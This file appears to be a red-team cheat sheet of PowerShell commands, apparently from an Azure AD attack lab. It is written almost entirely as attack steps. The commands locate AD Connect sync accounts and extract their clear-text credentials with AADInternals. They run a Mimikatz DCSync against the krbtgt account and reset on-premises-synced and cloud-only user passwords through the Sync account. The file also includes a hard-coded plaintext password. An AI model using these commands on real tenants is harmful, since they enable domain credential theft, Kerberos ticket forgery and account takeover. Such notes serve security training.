# We need to find if AD Connect is in use
# If you wanna use ActiveDictoryModule, use: Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Properties * | select SameAccountName,Description | fl
# the above command also includes the server name in the Description
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
# If it is enabled, we can run the following on the box that has ADSync running
Import-Module C:\AzAD\Tools\AADInternals\
Get-AADIntSyncCredentials
# this extracts the clear-text creds of both the MSOL and the Sync account. Then run dc-sync attack on the MSOL user
runas /netonly /user:defeng.corp\MSOL_782bef6aa0a9 cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:defeng\krbtgt /domain:defeng.corp /dc:defeng-dc.defeng.corp"'
# Alternatively, we can reset any cloud account with the Sync account
$creds = New-Object System.Management.Automation.PSCredential("Sync_DEFENG-ADCNCT_782bef6aa0a9@defcorpsecure.onmicrosoft.com", (ConvertTo-SecureString '<pass>' -AsPlainText -Force)
Get-AADIntAccessTokenForAADGraph -Credentials $creds -SaveToCache
Get-AADIntGlobalAdmins
Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId
Set-AADIntUserPassword -SourceAnchor "<ImmutableId>" -Password "New Pasword" -Verbose
# If it is a cloud-only user you want to reset, do the following:
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID
Set-AADIntUserPassword -CloudAnchor "<User_ObjectID>" -Password "New Password" -Verbose
$creds = New-Object System.Management.Automation.PSCredential('defeng-adcnct\administrator', (ConvertTo-SecureString "CredsToManageCl0udSync!" -AsPlainText -Force))
